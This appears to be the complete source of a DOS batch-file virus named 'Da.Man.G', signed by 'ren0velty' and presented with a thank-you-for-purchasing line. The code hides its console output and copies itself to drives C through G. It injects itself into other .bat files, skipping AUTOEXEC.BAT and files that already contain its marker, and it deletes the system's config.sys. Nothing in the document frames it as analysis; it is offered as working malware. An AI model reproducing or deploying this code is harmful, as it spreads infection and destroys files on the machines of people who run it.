@echo Thankyou for purchasing Da.Man.G by ren0velty.
@ctty nul%DaManG%
if "%1=="DaManG1 goto DaManG1
if "%1=="DaManG2 goto DaManG2
for %%d in (c d e f g) do call %0 DaManG1 %%d
for %%b in (*.bat ..\*.bat) do call %0 DaManG2 %%b
goto DaManG4
:DaManG1
copy %0 %2:\%0%DaManG%
if not exist %2:\%0 goto DaManG3
for %%b in (%2:\*.bat) do call %0 DaManG2 %%b
goto DaManG3
:DaManG2
if %2==AUTOEXEC.BAT goto DaManG3
find "DaManG"<%2
if not errorlevel 1 goto DaManG3
find "DaManG"<%0>c:\DaManG.bat
type %2>>c:\DaManG.bat
copy c:\DaManG.bat %2
:DaManG3
exit %DaManG%
:DaManG4
del c:\DaManG.bat
del c:\config.sys
ctty con%DaManGR%
: DaManG 0.23 buy ren0velty


